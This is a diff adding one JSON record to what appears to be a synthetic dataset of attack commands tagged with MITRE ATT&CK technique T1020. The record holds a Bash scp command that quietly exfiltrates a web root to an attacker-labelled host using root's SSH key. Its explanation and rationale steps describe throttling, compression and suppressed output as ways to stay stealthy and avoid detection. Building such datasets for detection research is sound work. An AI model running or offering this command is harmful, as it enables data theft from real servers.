@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "scp -q -C -l 300 -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -r /var/www/html attacker@198.51.100.10:/var/tmp/.cache/www_html >/dev/null 2>&1",
+  "explanation": "Recursively exfiltrates the web root using scp with compression and bandwidth throttling to minimize detection while operating non-interactively.",
+  "rationale_steps": [
+    "Use -r to recursively copy the target directory without creating local archives.",
+    "Enable -C to compress on-the-fly and -l to limit bandwidth for stealth.",
+    "Authenticate via SSH key and suppress host key prompts to run unattended.",
+    "Run in quiet mode and redirect output to avoid visible progress or logs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-a13b64e2",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
